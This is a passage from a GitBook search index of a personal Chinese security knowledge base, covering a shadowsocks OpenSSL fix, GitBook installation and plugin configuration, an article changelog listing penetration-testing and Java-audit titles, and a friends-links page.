EVP_CIPHER_CTX_cleanup 这是由于在openssl 1.1.0中废弃了 EVP_CIPHER_CTX_cleanup() 函数而引入了 EVE_CIPHER_CTX_reset() 函数所导致的 解决方案：https://floperry.github.io/2019/02/24/2018-06-25-Ubuntu-18.04-%E4%B8%8B%E8%A7%A3%E5%86%B3-shadowsocks-%E6%9C%8D%E5%8A%A1%E6%8A%A5%E9%94%99%E9%97%AE%E9%A2%98/ 1、定位错误文件 2、修改错误文件 vim /usr/local/lib/python3.8/dist-packages/shadowsocks/crypto/openssl.py 3、搜索 cleanup 并将其替换为 reset 4、再次启动，出现如下内容说明成功 客户端连接服务端 配置 成功截图 其他 疑难杂症 启动后发现客户端连接不上的情况，可能是因为服务器供应商的安全策略，有2种解决方案： 上供应商的平台去开启安全策略，允许非正常端口访问 替换为其他的端口，如80、8080等默认允许访问的端口 同类产品 go语言shadowsocks：https://github.com/shadowsocks/go-shadowsocks2 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-27 10:04:24 "},"个人知识库/04.暂未分类/02.GIT/1.gitbook.html":{"url":"个人知识库/04.暂未分类/02.GIT/1.gitbook.html","title":"1.gitbook","keywords":"","body":" 安装 初始化 写目录 更新 启动WEB 生成静态网站 安装插件 常用插件 快速生成summary flexible-alerts 高级格式显示的提示块 page-treeview 生成页内目录 二次修改插件 其他 [!Note] https://www.latelee.org/my-study/gitbook-note.html https://jiangminggithub.github.io/gitbook/1-install.html 安装 需要node 10.x，不然后面初始化会报错 npm install -g gitbook-cli 初始化 gitbook init 初始化过后会多2个文件，分别是 README.md（书籍的介绍在这个文件里） SUMMARY.md（书籍的目录结构在这里配置） 写目录 可以参考最下面的一键生成 * [CS](CS/CS.md) * [1.破解CS](CS/破解CS.md) * [2.Malleable C2 Profiles](CS/Malleable-C2-Profiles.md) * [3.启动](CS/启动.md) * [4.目录和菜单中文说明](CS/目录和菜单中文说明.md) * [5.Beacon](CS/Beacon.md) * [6.进阶：隐藏C2 - 通过特征](CS/进阶：隐藏C2 - 通过特征.md) * [7.进阶：隐藏C2 - 通过CDN](CS/进阶：隐藏C2 - 通过CDN.md) * 内网 * [1.内网基础知识整理](内网/1.内网基础知识整理.md) * [2.Kerberos协议](内网/2.kerberos协议.md) * [3.委派](内网/3.委派.md) * [4.ACL](内网/4.ACL.md) * [5.域环境搭建](内网/5.域环境搭建.md) * [6.内网渗透流程](内网/6.内网渗透流程.md) * [7.网络环境的判断](内网/7.网络环境的判断.md) * [8.内网权限提升](内网/8.内网权限提升.md) * [9.信息收集](内网/9.信息收集.md) * [10.横向移动](内网/10.横向移动.md) * [11.工具小结](内网/11.工具小结.md) * [12.攻击手法](内网/12.攻击手法.md) 更新 写完目录后再次执行gitbook init Gitbook会查找SUMMARY.md中描述的目录和文件，如果没有则会创建。上面的目录运行后是这样的 启动WEB gitbook serve 生成静态网站 gitbook build --format website 安装插件 新建book.json输入以下内容 [!NOTE] 这些都是我自己使用的插件，算是做个备份汇总吧 { \"title\" : \"d4m1ts 知识库\", \"author\" : \"d4m1ts\", \"description\" : \"个人的部分知识技能，倾向于使用知识库的方式进行总结回顾自己\", \"theme-default\": { \"showLevel\": true }, \"plugins\": [ \"-lunr\", \"-search\", \"search-plus\", \"-highlight\", \"chapter-fold\", \"expandable-chapters\",\"splitter\", \"page-treeview\", \"lightbox\", \"donate\", \"hide-element\", \"code\", \"tbfed-pagefooter\", \"pageview-count\", \"ancre-navigation\", \"anchor-navigation-ex\", \"insert-logo\", \"favicon\",\"github\",\"flexible-alerts\",\"prism\",\"copyright\" ], \"pluginsConfig\": { \"page-treeview\": { \"copyright\": \"Copyright &#169; d4m1ts\", \"minHeaderCount\": \"2\", \"minHeaderDeep\": \"2\" }, \"donate\": { \"wechat\": \"/README.assets/wx.jpeg\", \"alipay\": \"/README.assets/alipay.jpeg\", \"title\": \"\", \"button\": \"打赏☕️\", \"alipayText\": \"支付宝打赏\", \"wechatText\": \"微信打赏\" }, \"hide-element\": { \"elements\": [\".gitbook-link\", \".treeview__copyright\", \".treeview__main-title\"] }, \"tbfed-pagefooter\": { \"copyright\":\"Copyright &copy d4m1ts 2022\", \"modify_label\": \"该文章修订时间：\", \"modify_format\": \"YYYY-MM-DD HH:mm:ss\" }, \"insert-logo\": { \"url\": \"/README.assets/logo.png\", \"style\": \"background: none; max-height: 40px; min-height: 40px\" }, \"favicon\": { \"shortcut\": \"/README.assets/favicon.ico\", \"bookmark\": \"/README.assets/favicon.ico\", \"appleTouch\": \"/README.assets/favicon.ico\", \"appleTouchMore\": { \"120x120\": \"/README.assets/favicon.ico\", \"180x180\": \"/README.assets/favicon.ico\" } }, \"github\": { \"url\": \"https://github.com/damit5\" }, \"flexible-alerts\": { \"style\": \"callout\", \"comment\": { \"label\": \"Comment\", \"icon\": \"fa fa-comments\", \"className\": \"info\" } }, \"prism\": { \"css\": [ \"prismjs/themes/prism-tomorrow.css\" ], \"lang\": { \"flow\": \"typescript\" }, \"ignore\": [ \"mermaid\", \"eval-js\", \"ascii\", \"result\", \"manifest\", \"payload\", \"google\", \"tree\", \"java_out\", \"log4j2\", \"jsp\", \"class\", \"Exception\", \"stack\" ] }, \"copyright\": { \"site\": \"https://blog.gm7.org/\", \"author\": \"d4m1ts\", \"website\": \"d4m1ts 知识库\", \"image\": \"\", \"copyProtect\": true } } } 然后运行 gitbook install 然后启动就可以了 gitbook serve https://www.jianshu.com/p/2160f1ba68a0 常用插件 # 全面 https://jiangminggithub.github.io/gitbook/6-third_plugins.html https://www.jianshu.com/p/427b8bb066e6 https://segmentfault.com/a/1190000019806829 http://jartto.wang/2020/02/02/about-gitbook/ https://juejin.cn/post/6844903865146441741 https://github.com/orgs/GitbookIO/repositories?type=all https://github.com/search?q=gitbook-plugin-&type=all 快速生成summary https://blog.csdn.net/weixin_34383618/article/details/91629912 npm install -g gitbook-summary book sm book sm -i node_modules,_book # 忽略 node_modules和_book目录 flexible-alerts 高级格式显示的提示块 用法： > [!type|style:xx|label:xx|icon:xx|className:xx|labelVisibility:xx|iconVisibility:xx] > 内容部分 字段介绍，如果不设置的表示选择默认，除了!type都不是必需的。 键 允许的值 说明 !type NOTE，TIP，WARNING和DANGER 警告级别设置 style 以下值之一: callout（默认）, flat 警告样式，见图19的左右不同 label 任何文字 警告块的标题位置，即Note这个字段位置（不支持中文） icon e.g. 'fa fa-info-circle' 一个有效的Font Awesome图标，那块小符号 className CSS类的名称 指定css文件，用于指定外观 labelVisibility 以下值之一：visible（默认），hidden 标签是否可见 iconVisibility 以下值之一：visible（默认），hidden 图标是否可见 实例： 1. 这是简单的用法 > [!NOTE] > 这是一个简单的Note类型的使用，所有的属性都是默认值。 --- 2. 这是自定义属性的用法 > [!NOTE|style:flat|lable:Mylable|iconVisibility:hidden] > \"!type\":`NOTE`、\"style\":`flat`、\"lable\":`自定义标签`、图标不可见 1、Note [!NOTE] 这是一个简单的Note类型的使用，所有的属性都是默认值。 2、TIP [!TIP] TIPS 3、WARNING [!WARNING] WARNING|WARNING 4、DANGER [!DANGER] DANGER 5、自定义 [!COMMENT] 自定义的，在book.json中配置 6、正常 正常测试 7、高级使用 [!NOTE|style:flat|lable:Mylable] \"!type\":NOTE、\"style\":flat、\"lable\":自定义标签、图标可见 page-treeview 生成页内目录 生成后，会出现这一行，想要删除有2种方法： 直接用hide-element来隐藏，治标不治本 直接修改插件源码node_modules/gitbook-plugin-page-treeview/lib/index.js，删除如下部分即可 二次修改插件 有时候一些插件不太合心意，可以稍微修改修改 [!TIP|style:flat] 修改其他插件一样，找到路径就行了，node_modules/gitbook-plugin-xxx里面的index.js 主要参考上面的page-treeview修改 本网站主要修改了2个插件： page-treeview copyright：去除了最下面的版权信息，因为感觉不好看。。。 其他 https://github.com/snowdreams1006/gitbook-plugin-readmore https://snowdreams1006.github.io/gitbook-plugin-copyright/dev/zero2one.html Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-29 10:08:59 "},"更新日志.html":{"url":"更新日志.html","title":"更新日志","keywords":"","body":" 2021年12月 2021年12月18日 2021年12月25日 2021年12月27日 2021年12月28日 2021年12月29日 2021年12月30日 2021年12月31日 2022年01月 2022年01月06日 \\[(.*?)\\]\\(.*?\\) $1 ^.*?个人知识库/(.*?)/README\\.md$ | [$1](个人知识库/$1/) | 新增 | ^.*?个人知识库/(.*?)\\.md$ | [$1](个人知识库/$1.html) | 新增 | 2021年12月 2021年12月18日 知识框架搭建 2021年12月25日 路径 操作 02.代码审计/01.Java安全/1.审计基础/01.JVM类加载机制 新增 02.代码审计/01.Java安全/1.审计基础/02.Java反射机制 新增 02.代码审计/01.Java安全/1.审计基础/03.Java序列化与反序列化 新增 02.代码审计/01.Java安全/1.审计基础/04.RMI基础 新增 02.代码审计/01.Java安全/1.审计基础/05.JNDI注入 新增 02.代码审计/01.Java安全/1.审计基础/06.IDEA断点调试 新增 02.代码审计/01.Java安全/1.审计基础/07.Java加载字节码 新增 02.代码审计/01.Java安全/1.审计基础/08.javassist字节码编程 新增 02.代码审计/01.Java安全/1.审计基础/09.EL表达式 新增 02.代码审计/01.Java安全/1.审计基础/10.SpEL表达式 新增 02.代码审计/01.Java安全/1.审计基础/11.OGNL表达式 新增 02.代码审计/01.Java安全/1.审计基础/12.IDEA调试JAR 新增 02.代码审计/01.Java安全/2.各种分析/09.log4j2_rce分析 新增 02.代码审计/01.Java安全/2.各种分析/01.Apache_Commons_Collections中的反序列化 新增 02.代码审计/01.Java安全/2.各种分析/02.URLDNS链分析 新增 02.代码审计/01.Java安全/2.各种分析/03.log4j反序列化漏洞分析 新增 02.代码审计/01.Java安全/2.各种分析/04.Fastjson 1.2.24反序列化漏洞分析 新增 02.代码审计/01.Java安全/2.各种分析/05.Fastjson的dnslog探测方式分析 新增 02.代码审计/01.Java安全/2.各种分析/06.Fastjson各版本漏洞分析 新增 02.代码审计/01.Java安全/2.各种分析/07.Fastjson1.2.68分析 新增 02.代码审计/01.Java安全/2.各种分析/08.ysoserial-C3P0分析 新增 02.代码审计/01.Java安全/3.内存马/01.Tomcat内存马 新增 02.代码审计/01.Java安全/3.内存马/02.Spring内存马 新增 02.代码审计/01.Java安全/3.内存马/03.Java Agent 内存马 新增 2021年12月27日 路径 操作 01.渗透测试/01.信息收集/1.资产收集/1.信息收集之主域名收集 新增 01.渗透测试/01.信息收集/1.资产收集/2.信息收集之子域名收集 新增 01.渗透测试/01.信息收集/1.资产收集/3.信息收集之其他信息收集 新增 01.渗透测试/01.信息收集/2.绕过CDN寻找真实IP/1.绕过CDN寻找真实IP 新增 02.代码审计/01.Java安全/1.审计基础/05.JNDI注入 修正一张错误图片 03.编程开发/GO/01.GO入门基础 新增 04.暂未分类/01.代理类/Linux下搭建ShadowSocks服务器 新增 2021年12月28日 路径 操作 04.暂未分类/02.GIT/1.gitbook 新增 2021年12月29日 路径 操作 03.编程开发/GO/02.GO常用实例 新增 03.编程开发/GO/03.使用GO编写POC 新增 2021年12月30日 路径 操作 02.代码审计/02.C:C++/01.工具Flawfinder 新增 2021年12月31日 路径 操作 03.编程开发/GO/04.使用GO模拟登陆 新增 2022年01月 2022年01月06日 路径 操作 01.渗透测试/01.信息收集/1.资产收集/01.主域名收集/01.ICP备案查询 新增 01.渗透测试/01.信息收集/1.资产收集/01.主域名收集/02.WHOIS查询 新增 01.渗透测试/01.信息收集/1.资产收集/01.主域名收集/03.证书查询 新增 01.渗透测试/01.信息收集/1.资产收集/01.主域名收集/04.DNS共享记录查询 新增 01.渗透测试/01.信息收集/1.资产收集/01.主域名收集/05.IP反查 新增 01.渗透测试/01.信息收集/1.资产收集/01.主域名收集 新增 01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/01.证书透明度 新增 01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/02.DNS域传送 新增 01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/03.DNS公开数据集 新增 01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/04.搜索引擎 新增 01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/05.信息泄露 新增 01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/06.第三方在线平台 新增 01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/07.子域名枚举爆破 新增 01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/08.工具自动化 新增 01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/09.构造域名 新增 01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/10.存活性探测 新增 01.渗透测试/01.信息收集/1.资产收集/02.子域名收集 新增 01.渗透测试/01.信息收集/1.资产收集/03.IP段信息收集/01.绕过CDN寻找真实IP 新增 01.渗透测试/01.信息收集/1.资产收集/03.IP段信息收集/02.网络空间搜索引擎 新增 01.渗透测试/01.信息收集/1.资产收集/03.IP段信息收集/03.C段扫描工具 新增 01.渗透测试/01.信息收集/1.资产收集/03.IP段信息收集/04.组合工具 新增 01.渗透测试/01.信息收集/1.资产收集/03.IP段信息收集/05.浏览器插件 新增 01.渗透测试/01.信息收集/1.资产收集/03.IP段信息收集/06.端口对应渗透（端口渗透备忘录） 新增 01.渗透测试/01.信息收集/1.资产收集/03.IP段信息收集 新增 01.渗透测试/01.信息收集/1.资产收集/04.其他应用收集/01.小程序 新增 01.渗透测试/01.信息收集/1.资产收集/04.其他应用收集/02.公众号 新增 01.渗透测试/01.信息收集/1.资产收集/04.其他应用收集/03.APP 新增 01.渗透测试/01.信息收集/1.资产收集/04.其他应用收集 新增 01.渗透测试/01.信息收集/1.资产收集/1.信息收集之主域名收集 新增 01.渗透测试/01.信息收集/1.资产收集/2.信息收集之子域名收集 新增 01.渗透测试/01.信息收集/1.资产收集/3.信息收集之其他信息收集 新增 01.渗透测试/01.信息收集/2.指纹识别/01.CMS识别/01.在线平台 新增 01.渗透测试/01.信息收集/2.指纹识别/01.CMS识别/02.工具 新增 01.渗透测试/01.信息收集/2.指纹识别/01.CMS识别/03.浏览器插件 新增 01.渗透测试/01.信息收集/2.指纹识别/01.CMS识别 新增 01.渗透测试/01.信息收集/2.指纹识别/02.WAF识别 新增 01.渗透测试/01.信息收集/3.敏感信息收集/01.目录扫描 新增 01.渗透测试/01.信息收集/3.敏感信息收集/02.Google Hacking 新增 01.渗透测试/01.信息收集/3.敏感信息收集/03.GitHub信息收集 新增 01.渗透测试/01.信息收集/3.敏感信息收集/04.JS信息收集 新增 01.渗透测试/01.信息收集/3.敏感信息收集/05.网盘信息收集 新增 01.渗透测试/01.信息收集/3.敏感信息收集/06.邮箱信息收集 新增 01.渗透测试/01.信息收集/3.敏感信息收集/07.历史页面 新增 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-06 14:57:49 "},"友情链接.html":{"url":"友情链接.html","title":"友情链接","keywords":"","body":"以下排名不分先后 略略略 d3sh1n 昏鸦 laker Al1ex AresX Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-07 09:13:09 "}}